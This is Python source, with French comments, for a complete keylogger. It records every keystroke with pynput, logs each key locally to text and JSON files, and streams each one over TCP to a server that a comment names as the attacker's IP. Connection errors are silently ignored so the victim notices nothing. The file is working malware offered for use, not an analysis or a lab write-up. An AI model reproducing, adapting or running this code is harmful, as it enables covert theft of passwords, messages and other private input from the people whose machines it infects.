import pynput.keyboard
import socket
import threading
import json
import uuid
import os

SERVER_IP = "192.168.1.10"    # <-- Remplace par l'IP de l'attaquant
SERVER_PORT = 5001
LOG_PATH = "keylog.txt"
JSON_PATH = "keylog.json"

unique_id = str(uuid.uuid4())

def save_log(data):
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write(data)
    # Optionnel : log en format JSON
    logs = []
    if os.path.exists(JSON_PATH):
        with open(JSON_PATH, "r", encoding="utf-8") as jf:
            try:
                logs = json.load(jf)
            except:
                logs = []
    logs.append({"uuid": unique_id, "key": data})
    with open(JSON_PATH, "w", encoding="utf-8") as jf:
        json.dump(logs, jf)

def on_press(key):
    try:
        data = str(key.char)
    except AttributeError:
        data = f"<{key}>"
    save_log(data)
    send_tcp(data)

def send_tcp(data):
    try:
        with socket.create_connection((SERVER_IP, SERVER_PORT), timeout=1) as s:
            msg = json.dumps({"uuid": unique_id, "key": data}) + "\n"
            s.sendall(msg.encode("utf-8"))
    except Exception:
        pass  # Ne pas bloquer la frappe si la connexion échoue

def keylogger():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    keylogger()